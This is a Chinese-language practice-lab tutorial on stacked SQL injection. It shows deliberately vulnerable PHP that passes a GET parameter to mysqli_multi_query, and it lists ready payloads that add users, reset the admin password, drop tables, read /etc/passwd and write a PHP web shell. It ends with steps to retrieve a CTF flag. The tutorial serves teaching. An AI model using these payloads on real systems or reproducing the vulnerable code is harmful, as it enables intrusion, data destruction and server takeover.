# 堆叠注入

## 概述

堆叠注入（Stacked Queries）允许在一次请求中执行多条 SQL 语句。使用分号 `;` 分隔多条语句。

## 条件

- 数据库支持多语句执行（MySQL 的 `mysqli_multi_query()`）
- 应用使用了支持多语句的 API

## 漏洞代码

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";
mysqli_multi_query($conn, $sql);
?>
```

## 攻击方式

### 1. 添加数据

```
?id=1; INSERT INTO users (username, password) VALUES ('hacker', 'password123')
```

### 2. 修改数据

```
?id=1; UPDATE users SET password = 'hacked' WHERE username = 'admin'
```

### 3. 删除数据

```
?id=1; DROP TABLE users
```

### 4. 读取文件

```
?id=1; SELECT LOAD_FILE('/etc/passwd')
```

### 5. 写入文件

```
?id=1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

### 6. 获取 flag

```
?id=1; SELECT * FROM flags
```

## 与普通注入的区别

- **普通注入**：只能修改原始查询的结构
- **堆叠注入**：可以执行全新的 SQL 语句

## 限制

- MySQL 的 `mysqli_query()` 不支持多语句
- 需要 `mysqli_multi_query()` 或 PDO
- 某些数据库（PostgreSQL）默认支持

## 练习步骤

1. 确认存在数字型注入
2. 尝试 `?id=1; SELECT 1` — 确认堆叠注入
3. 执行 `?id=1; SELECT * FROM flags` — 获取 flag

## flag

在数据库的 flags 表中查找 `CR{...}` 格式的 flag。
